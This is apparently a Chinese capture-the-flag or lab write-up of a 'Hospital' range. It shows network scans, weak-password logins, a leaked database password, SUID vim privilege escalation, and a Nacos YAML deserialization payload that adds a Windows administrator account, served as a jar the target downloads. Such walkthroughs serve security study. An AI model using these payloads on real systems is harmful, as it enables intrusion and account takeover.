<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="Spring Boot Heapdump and Shiro Deserialization and Nacos Client Yaml Deserialization and Fastjson Deserialization and Grafana Unauthorized Arbitrary File Reading and PostgreSQL and Multi-level Intrane">
<meta property="og:type" content="article">
<meta property="og:title" content="Hospital Writeup">
<meta property="og:url" content="https://hyggevv.github.io/2025/03/13/Hospital/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="Spring Boot Heapdump and Shiro Deserialization and Nacos Client Yaml Deserialization and Fastjson Deserialization and Grafana Unauthorized Arbitrary File Reading and PostgreSQL and Multi-level Intrane">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/23png.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/33.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/30.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/34.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/32.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/35.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/36.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/37.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/38.png">
<meta property="og:image" content="https://hyggevv.github.io/2025/03/13/Hospital/39.png">
<meta property="article:published_time" content="2025-03-13T02:06:20.000Z">
<meta property="article:modified_time" content="2025-03-14T05:59:54.337Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2025/03/13/Hospital/3.png"><title>Hospital Writeup | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2025/03/13/Hospital/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copiar","copySuccess":"Éxito en copia","copyError":"Error en copia"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Inicio</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archivos</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categorías</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Etiquetas</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">Sobre Nosotros</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Hospital Writeup</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Creado</span><span class="post-meta-item__value">2025-03-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Actualizado</span><span class="post-meta-item__value">2025-03-14</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visitado</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="外网信息收集">
          <a href="#外网信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h1>
      <p><img src="/2025/03/13/Hospital/3.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">D:\桌面\信息收集\fscan2&gt;fscan.exe -h 39.99.146.10</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 2.0.0</span><br><span class="line">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="line">[*] 开始信息扫描...</span><br><span class="line">[*] 最终有效主机数量: 1</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 39.99.146.10:22</span><br><span class="line">[+] 端口开放 39.99.146.10:8080</span><br><span class="line">[+] 存活端口数量: 2</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[*] 网站标题 http://39.99.146.10:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.146.10:8080/login;jsessionid=935B60352AE61077035EC687C20917ED</span><br><span class="line">[*] 网站标题 http://39.99.146.10:8080/login;jsessionid=935B60352AE61077035EC687C20917ED 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="line">[!] 扫描错误 39.99.146.10:22 - 扫描总时间超时: context deadline exceeded</span><br><span class="line">[+] [发现漏洞] 目标: http://39.99.146.10:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称:</span><br><span class="line">  详细信息: %!s(&lt;nil&gt;)</span><br><span class="line">[+] 扫描已完成: 2/2</span><br><span class="line">[*] 扫描结束,耗时: 22.9915811s</span><br></pre></td></tr></table></div></figure>


        <h2 id="医疗管理后台">
          <a href="#医疗管理后台" class="heading-link"><i class="fas fa-link"></i></a><a href="#医疗管理后台" class="headerlink" title="医疗管理后台"></a>医疗管理后台</h2>
      <p><img src="/2025/03/13/Hospital/1.png"></p>
<p>弱口令admin&#x2F;admin123进入</p>
<p><img src="/2025/03/13/Hospital/2.png"></p>
<p>此时发现这个是一个存前端的界面；继续对该ip进行信息收集</p>

        <h3 id="Spring-Boot-Heapdump">
          <a href="#Spring-Boot-Heapdump" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring-Boot-Heapdump" class="headerlink" title="Spring Boot Heapdump"></a>Spring Boot Heapdump</h3>
      <p>fscan扫出：poc-yaml-spring-actuator-heapdump-file</p>
<p><img src="/2025/03/13/Hospital/4.png"></p>
<p>下载heapdump；使用JDumpSpider-1.1-SNAPSHOT-full.jar进行分析</p>

        <h3 id="Shiro-Deserialization">
          <a href="#Shiro-Deserialization" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro-Deserialization" class="headerlink" title="Shiro Deserialization"></a>Shiro Deserialization</h3>
      <p><img src="/2025/03/13/Hospital/5.png"></p>

        <h3 id="getshell">
          <a href="#getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3>
      <p><img src="/2025/03/13/Hospital/6.png"></p>
<p><img src="/2025/03/13/Hospital/7.png"></p>

        <h4 id="Vim-basic-提权">
          <a href="#Vim-basic-提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vim-basic-提权" class="headerlink" title="Vim.basic 提权"></a>Vim.basic 提权</h4>
      <p><img src="/2025/03/13/Hospital/9.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></div></figure>


        <h1 id="内网渗透">
          <a href="#内网渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1>
      
        <h2 id="内网信息收集">
          <a href="#内网信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2>
      <p><img src="/2025/03/13/Hospital/14.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">app@web01:/tmp$ ./fscan -h 172.30.12.1/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-03-13 11:43:38] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-13 11:43:38] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-13 11:43:38] [INFO] CIDR范围: 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-03-13 11:43:38] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-13 11:43:38] [INFO] 解析CIDR 172.30.12.1/24 -&gt; IP范围 172.30.12.0-172.30.12.255</span><br><span class="line">[2025-03-13 11:43:38] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-13 11:43:39] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-13 11:43:39] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-03-13 11:43:39] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-03-13 11:43:39] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-03-13 11:43:39] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)</span><br><span class="line">[2025-03-13 11:43:39] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)</span><br><span class="line">[2025-03-13 11:43:43] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)</span><br><span class="line">[2025-03-13 11:43:45] [INFO] 存活主机数量: 3</span><br><span class="line">[2025-03-13 11:43:45] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.6:135</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.6:139</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.6:445</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.236:22</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.5:22</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.236:8009</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.5:8080</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.236:8080</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 端口开放 172.30.12.6:8848</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 服务识别 172.30.12.236:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-03-13 11:43:45] [SUCCESS] 服务识别 172.30.12.5:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-03-13 11:43:50] [SUCCESS] 服务识别 172.30.12.6:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-13 11:43:50] [SUCCESS] 服务识别 172.30.12.6:445 =&gt; </span><br><span class="line">[2025-03-13 11:43:50] [SUCCESS] 服务识别 172.30.12.236:8009 =&gt; </span><br><span class="line">[2025-03-13 11:43:50] [SUCCESS] 服务识别 172.30.12.5:8080 =&gt; [http]</span><br><span class="line">[2025-03-13 11:43:51] [SUCCESS] 服务识别 172.30.12.236:8080 =&gt; [http]</span><br><span class="line">[2025-03-13 11:43:55] [SUCCESS] 服务识别 172.30.12.6:8848 =&gt; [http]</span><br><span class="line">[2025-03-13 11:44:50] [SUCCESS] 服务识别 172.30.12.6:135 =&gt; </span><br><span class="line">[2025-03-13 11:44:50] [INFO] 存活端口数量: 9</span><br><span class="line">[2025-03-13 11:44:50] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-03-13 11:44:50] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-03-13 11:44:50] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.30.12.6</span><br><span class="line">主机名: Server02</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.30.12.6</span><br><span class="line">[2025-03-13 11:44:50] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[2025-03-13 11:44:50] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=77899D13F4306070E6BD10E1C48406CB</span><br><span class="line">[2025-03-13 11:44:50] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="line">[2025-03-13 11:44:51] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=77899D13F4306070E6BD10E1C48406CB 状态码:200 长度:2005   标题:医疗管理后台</span><br><span class="line">[2025-03-13 11:44:51] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found</span><br><span class="line">[2025-03-13 11:44:51] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://blog.csdn.net/caiqiiqi/article/details/112005424</span><br><span class="line">[2025-03-13 11:44:52] [SUCCESS] 目标: http://172.30.12.6:8848</span><br><span class="line">  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:kmahyyg(https://github.com/kmahyyg)</span><br><span class="line">        links:https://github.com/alibaba/nacos/issues/4593</span><br><span class="line">[2025-03-13 11:44:52] [SUCCESS] 目标: http://172.30.12.5:8080</span><br><span class="line">  漏洞类型: poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">  漏洞名称: </span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/wyb628/p/8567610.html</span><br><span class="line">[2025-03-13 11:51:05] [SUCCESS] 扫描已完成: 16/16</span><br></pre></td></tr></table></div></figure>


        <h2 id="Nacos">
          <a href="#Nacos" class="heading-link"><i class="fas fa-link"></i></a><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h2>
      <p><img src="/2025/03/13/Hospital/10.png"></p>
<p>弱口令nacos&#x2F;nacos进入</p>
<p><img src="/2025/03/13/Hospital/11.png"></p>
<p>获取到的配置文件内容如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 8080</span><br><span class="line">  servlet:</span><br><span class="line">    context-path: /hello</span><br><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  application:</span><br><span class="line">    name: db-config</span><br><span class="line">  cloud:</span><br><span class="line">    nacos:</span><br><span class="line">      discovery:</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">      config:</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">        file-extension: yaml</span><br><span class="line">        namespace: dev</span><br><span class="line">        group: DEFAULT_GROUP</span><br><span class="line">        data-id: db-config.yaml</span><br><span class="line">  datasource:</span><br><span class="line">    mysql:</span><br><span class="line">      url: jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true</span><br><span class="line">      username: root</span><br><span class="line">      password: P@ssWord!!!</span><br><span class="line">  redis:</span><br><span class="line">    host: localhost</span><br><span class="line">    port: 6379</span><br><span class="line"></span><br><span class="line">management:</span><br><span class="line">  endpoints:</span><br><span class="line">    web:</span><br><span class="line">      exposure:</span><br><span class="line">        include: &#x27;*&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>敏感信息：mysql:root:P@ssWord!!!</p>

        <h3 id="Nacos-Client-Yaml-Deserialization">
          <a href="#Nacos-Client-Yaml-Deserialization" class="heading-link"><i class="fas fa-link"></i></a><a href="#Nacos-Client-Yaml-Deserialization" class="headerlink" title="Nacos Client Yaml Deserialization"></a>Nacos Client Yaml Deserialization</h3>
      <p><img src="/2025/03/13/Hospital/23png.png"></p>
<p>使用:<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI/tree/main/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83/nacos-client_yaml_deserialize/yaml-payload/src/artsploit">https://github.com/charonlight/NacosExploitGUI/tree/main/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83/nacos-client_yaml_deserialize/yaml-payload/src/artsploit</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="/2025/03/13/Hospital/12.png"></p>
<p>只需要修改 <code>AwesomeScriptEngineFactory.java</code> 文件中的内容即可，此处建议直接添加个管理员账户：</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;net user hey 626620a /add&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;net localgroup administrators hey /add&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>现成的打包bat，挺好，打包后生成yaml-payload.jar。</p>
<p><img src="/2025/03/13/Hospital/13.png"></p>
<p>将恶意的 <code>yaml-payload.jar</code> 包上传至 web01 主机上，并开启一个 http 服务：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@web01:~# python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">172.30.12.6 - - [29/Dec/2023 14:52:42] &quot;GET /yaml-payload.jar HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></div></figure>

